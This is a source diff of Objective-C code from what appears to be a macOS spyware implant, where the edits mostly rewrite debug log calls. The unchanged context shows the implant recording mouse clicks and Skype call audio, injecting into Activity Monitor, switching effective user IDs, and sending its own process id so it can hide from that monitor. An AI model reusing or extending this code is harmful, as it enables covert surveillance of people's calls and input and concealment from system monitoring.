@@ -531,9 +531,8 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   
   ptrSInt16Buffer = (char *)floatToSInt16Buffer;
-
 #ifdef DEBUG_SPEEX
-  infoLog(@"Audio Chunk SIZE: %d", audioChunkSize);
+  verboseLog(@"Audio Chunk SIZE: %d", audioChunkSize);
   
   // Write a Wav
   NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
@@ -750,7 +749,7 @@ static void computerWillShutdown(CFMachPortRef port,
                              shMemLog->status,
                              shMemLog->commandDataSize,
                              shMemLog->commandData);
-                    infoLog(@"%s: header data size %d", __FUNCTION__, sizeof(shMemoryLog));
+                    verboseLog(@"header data size %d", sizeof(shMemoryLog));
 #endif
                   }
             
@@ -788,20 +787,20 @@ static void computerWillShutdown(CFMachPortRef port,
                                           withLogID: 0] == TRUE)
                       {
 #ifdef DEBUG_CORE
-                        infoLog(@"%s Mouse click logged correctly", __FUNCTION__);
+                        infoLog(@"Mouse click logged correctly");
 #endif
                       }
                     else
                       {
 #ifdef DEBUG_CORE
-                        errorLog(@"%s Error while writing data to AGENT_MOUSE log", __FUNCTION__);
+                        errorLog(@"Error while writing data to AGENT_MOUSE log");
 #endif
                       }
                   }
                 else
                   {
 #ifdef DEBUG_CORE
-                    errorLog(@"%s Error while creating AGENT_MOUSE log", __FUNCTION__);
+                    errorLog(@"Error while creating AGENT_MOUSE log");
 #endif
                   }
                 
@@ -927,7 +926,7 @@ static void computerWillShutdown(CFMachPortRef port,
                           else
                             {
 #ifdef DEBUG_CORE
-                              errorLog(@"%s Error while creating log for input (skype)", __FUNCTION__);
+                              errorLog(@"Error while creating log for input (skype)");
 #endif
                             }
                             
@@ -1001,7 +1000,7 @@ static void computerWillShutdown(CFMachPortRef port,
                               else
                                 {
 #ifdef DEBUG_CORE
-                                  errorLog(@"%s Error while creating close log file for input (skype)", __FUNCTION__);
+                                  errorLog(@"Error while creating close log file for input (skype)");
 #endif
                                 }
                               
@@ -1065,7 +1064,7 @@ static void computerWillShutdown(CFMachPortRef port,
                           else
                             {
 #ifdef DEBUG_CORE
-                              errorLog(@"%s Error while creating log for output (skype)", __FUNCTION__);
+                              errorLog(@"Error while creating log for output (skype)");
 #endif
                             }
                           
@@ -1137,7 +1136,7 @@ static void computerWillShutdown(CFMachPortRef port,
                               else
                                 {
 #ifdef DEBUG_CORE
-                                  errorLog(@"%s Error while creating close log file for output (skype)", __FUNCTION__);
+                                  errorLog(@"Error while creating close log file for output (skype)");
 #endif
                                 }
                                 
@@ -1250,7 +1249,7 @@ static void computerWillShutdown(CFMachPortRef port,
             {
 #ifdef DEBUG_CORE
               if (x == 0)
-                verboseLog(@"Skype is running");
+                warnLog(@"Skype is running");
 #endif
               [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.001]];
             }
@@ -1258,7 +1257,7 @@ static void computerWillShutdown(CFMachPortRef port,
             {
 #ifdef DEBUG_CORE
               if (x == 0)
-                verboseLog(@"Skype is not running");
+                warnLog(@"Skype is not running");
 #endif
               [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.1]];
             }
@@ -2330,6 +2329,10 @@ static void computerWillShutdown(CFMachPortRef port,
 {
   NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
   
+#ifdef ENABLE_LOGGING
+  [RCSMLogger setComponent: @"core"];
+#endif
+  
   BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
   
   // Get OS version
@@ -2626,14 +2629,14 @@ static void computerWillShutdown(CFMachPortRef port,
       if (pActivityM != nil) 
         {
 #ifdef DEBUG_CORE
-          warnLog(@"%s: find running ActivityMonitor with pid %d, injecting...", __FUNCTION__, pActivityM);
+          warnLog(@"find running ActivityMonitor with pid %d, injecting...", pActivityM);
 #endif
           [self sendEventToPid: pActivityM];
         }
       else 
         {
 #ifdef DEBUG_CORE
-          warnLog(@"%s: no running ActivityMonitor", __FUNCTION__);
+          warnLog(@"no running ActivityMonitor");
 #endif
         }
     }
@@ -2680,7 +2683,6 @@ static void computerWillShutdown(CFMachPortRef port,
   [self _communicateWithAgents];
   
   [innerPool release];
-
   return YES;
 }
 
@@ -2708,7 +2710,7 @@ static void computerWillShutdown(CFMachPortRef port,
   SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
   
 #ifdef DEBUG_CORE
-  infoLog(@"%s: send event to application pid %d", __FUNCTION__, pidP);
+  verboseLog(@"send event to application pid %d", pidP);
 #endif
   
   [app setDelegate: self];
@@ -2716,8 +2718,8 @@ static void computerWillShutdown(CFMachPortRef port,
   [gSuidLock lock];
   
 #ifdef DEBUG_CORE
-  infoLog(@"%s: enter critical session [euid/uid %d/%d]", 
-        __FUNCTION__, geteuid(), getuid());
+  verboseLog(@"enter critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
 #endif
   
   // trimming process u&g
@@ -2746,8 +2748,8 @@ static void computerWillShutdown(CFMachPortRef port,
       if (seteuid(eUid) == -1)
         {
 #ifdef DEBUG_CORE
-          infoLog(@"%s: setting euid error [%d]", 
-                __FUNCTION__, errno);
+          infoLog(@"setting euid error [%d]", 
+                  errno);
 #endif
         }
     
@@ -2757,8 +2759,8 @@ static void computerWillShutdown(CFMachPortRef port,
   [gSuidLock unlock];
   
 #ifdef DEBUG_CORE
-  infoLog(@"%s: exit critical session [euid/uid %d/%d]", 
-        __FUNCTION__, geteuid(), getuid());
+  verboseLog(@"exit critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
 #endif
   
   if (injectReply != nil) 
@@ -2770,7 +2772,7 @@ static void computerWillShutdown(CFMachPortRef port,
   else 
     {
 #ifdef DEBUG_CORE
-      infoLog(@"%s: injection done", __FUNCTION__);
+      verboseLog(@"injection done");
 #endif
     }
   
@@ -2785,7 +2787,7 @@ static void computerWillShutdown(CFMachPortRef port,
   NSDictionary *appInfo = [notification userInfo];
 
 #ifdef DEBUG_CORE
-  infoLog(@"%s: running new notificaion on app %@", __FUNCTION__, appInfo);
+  verboseLog(@"running new notificaion on app %@", appInfo);
 #endif
 
   if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
@@ -2817,7 +2819,7 @@ static void computerWillShutdown(CFMachPortRef port,
   pid_t amPid = getpid();
   
 #ifdef DEBUG_CORE
-  infoLog(@"%s: sending pid to activity monitor %d", __FUNCTION__, amPid);
+  infoLog(@"sending pid to activity monitor %d", amPid);
 #endif
   
   shMemoryCommand *shMemoryHeader   = (shMemoryCommand *)[pidCommand bytes];
@@ -2832,13 +2834,13 @@ static void computerWillShutdown(CFMachPortRef port,
                           fromComponent: COMP_CORE] == TRUE)
     {
 #ifdef DEBUG_CORE
-      infoLog(@"%s: running pid %d to activity monitor", __FUNCTION__, amPid);
+      infoLog(@"running pid %d to activity monitor", amPid);
 #endif
     }
   else 
     {
 #ifdef DEBUG_CORE
-      infoLog(@"%s: running pid to activity monitor failed", __FUNCTION__);
+      infoLog(@"running pid to activity monitor failed");
 #endif
     }
   
@@ -2851,7 +2853,7 @@ static void computerWillShutdown(CFMachPortRef port,
 {
 #ifdef DEBUG_CORE
   NSDictionary* userInfo = [error userInfo];
-	infoLog(@"%s: Event %@, error %@", __FUNCTION__, event, userInfo);
+	infoLog(@"Event %@, error %@", event, userInfo);
 #endif
   
 }*/
